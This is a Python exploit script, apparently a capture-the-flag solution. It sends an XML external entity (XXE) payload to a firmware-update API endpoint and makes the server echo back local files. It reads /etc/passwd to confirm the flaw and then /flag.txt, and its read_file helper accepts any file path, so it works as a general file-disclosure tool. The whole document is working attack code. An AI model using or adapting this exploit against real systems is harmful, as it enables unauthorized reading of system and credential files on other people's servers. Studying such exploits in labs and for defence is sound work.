#!/usr/bin/env python3
import sys
import requests


def read_file(base_url, path):
    # External entity pointing at a local file. The parser resolves it and
    # the value of <Version> is echoed back in the "message" field.
    xml = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE r [<!ENTITY x SYSTEM "file://{path}">]>'
        "<FirmwareUpdateConfig><Firmware>"
        "<Version>&x;</Version>"
        "</Firmware></FirmwareUpdateConfig>"
    )
    response = requests.post(
        f"{base_url}/api/update",
        data=xml,
        headers={"Content-Type": "application/xml"},
        timeout=5,
    )
    return response.json()["message"]


def exploit(target_ip, target_port):
    base_url = f"http://{target_ip}:{target_port}"

    print("[*] Reading /etc/passwd to confirm XXE...")
    print(read_file(base_url, "/etc/passwd"))

    print("[*] Reading /flag.txt...")
    print(read_file(base_url, "/flag.txt"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
